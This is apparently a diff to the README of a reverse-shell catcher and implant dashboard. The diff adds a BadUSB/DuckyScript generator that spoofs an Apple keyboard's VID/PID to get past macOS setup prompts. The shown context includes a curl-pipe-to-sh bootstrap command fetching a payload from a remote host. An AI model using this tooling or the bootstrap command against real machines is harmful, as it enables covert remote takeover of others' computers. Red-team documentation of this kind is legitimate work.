@@ -14,16 +14,17 @@ A single-host, multi-transport reverse-shell catcher with a browser dashboard.
   - multiplexed WebSocket/protobuf implant protocol with a Go client
 - **Dashboard:**
   - live session list with a full PTY terminal (resize + mouse support)
+  - per-host file transfer (upload + download) and native file-system browser
+  - HTTP CONNECT proxy controls per mux host
+  - BadUSB / DuckyScript generator with OS/arch target, device selector
+    (Flipper Zero or USB Rubber Ducky), Apple VID/PID spoofing for macOS,
+    and pre-payload delay
+  - copyable payload examples (raw TCP, TLS, webshell, mux)
+  - command palette (`Ctrl+K`) to jump to hosts/sessions
+  - browser notifications for new sessions
   - one-click offline-session cleanup
   - session scrollback download
   - live in-memory event log
-  - copyable payload examples (raw TCP, TLS, webshell, mux)
-  - BadUSB / DuckyScript generator with OS/arch target, VID/PID spoofing, and pre-payload delay
-  - per-host file transfer (upload + download)
-  - native file-system browser with directory navigation
-  - HTTP CONNECT proxy controls
-  - command palette (`Ctrl+K`) to jump to hosts/sessions
-  - browser notifications for new sessions
   - keyboard help overlay (`?`)
   - resizable sidebar and log panels
 - **Auth:** session-cookie login; protects the dashboard, REST API, and browser-facing WebSocket endpoints.
@@ -183,6 +184,17 @@ runs the binary, useful when the target can type only a short command:
 # Linux/macOS target
 curl -sL 'https://rsl.example.com/dl/s?token=YOUR_BUILD_TOKEN&os=linux' | sh
 ```
+
+### BadUSB / DuckyScript generator
+
+The dashboard can generate a DuckyScript payload that types a short bootstrap
+command into the target. Choose the target OS/arch, the BadUSB device
+(Flipper Zero / BadUSB or USB Rubber Ducky / Bash Bunny), and an initial delay.
+
+On macOS the generator defaults to spoofing an Apple keyboard
+(`VID 0x05ac / PID 0x0281`) so the target skips the Keyboard Setup Assistant.
+The Rubber Ducky output uses `ATTACKMODE HID VID_05AC PID_0281`; the Flipper
+output uses `ID 05ac:0281 Apple:Keyboard`.
 
 ## Cross-compiling the Go client manually
 
